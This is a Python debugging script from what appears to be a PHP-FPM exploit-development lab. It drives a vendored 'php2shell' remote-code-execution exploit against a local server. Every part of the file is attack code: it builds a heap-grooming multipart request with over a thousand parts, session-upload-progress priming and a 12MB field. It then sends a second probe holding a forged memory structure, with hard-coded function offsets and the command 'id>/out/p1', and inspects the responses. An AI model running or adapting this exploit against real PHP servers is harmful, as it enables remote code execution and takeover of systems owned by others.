#!/usr/bin/env python3
"""Diagnose the FPM stage-1 A request: what does the OOM groom return?"""
from __future__ import annotations

import os
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))
sys.path.insert(0, LAB)

import php2shell_calibrate as C  # noqa: E402
from ka_target import KATarget  # noqa: E402

URL = "http://127.0.0.1:8304/index.php"

mod = C.load_upstream(VENDOR)
ZIF, DTOR = 0x489540, 0x57C110
ka = KATarget(mod.Target(URL, verbose=False))
ex = mod.Exploit(ka, "id>/out/p1", zif_offset=ZIF, dtor_offset=DTOR,
                 profile="bookworm", verbose=False)

# A shape: 1001 tiny parts + session priming + file + 12MB big field
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
          ex._file_part(), ex._big_field()]
body = mod.build_multipart(parts, b"S" * 17)
print(f"[*] A body: {len(body)} bytes")
raw = ka.post(body, b"S" * 17, read_cap=1 << 20, timeout=90.0)
head, _, tail = (raw or b"").partition(b"\r\n\r\n")
print(f"[*] A response: {len(raw)} bytes; head:")
print(head[:400].decode("latin1"))
print(f"[*] body head: {tail[:200]!r}")
time.sleep(0.2)

# B probe
parts = [{"name": "PHPSESSID", "data": mod.SID},
         {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(900):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
import struct
forge = bytearray(b"A" * 48)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
raw_b = ka.post(mod.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
head_b, _, body_b = (raw_b or b"").partition(b"\r\n\r\n")
import re
m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", raw_b or b"")
print(f"[*] B response: {len(raw_b)} bytes; Set-Cookie len="
      f"{len(m.group(1)) if m else 0}")
print(f"[*] B head: {head_b[:200].decode('latin1')}")
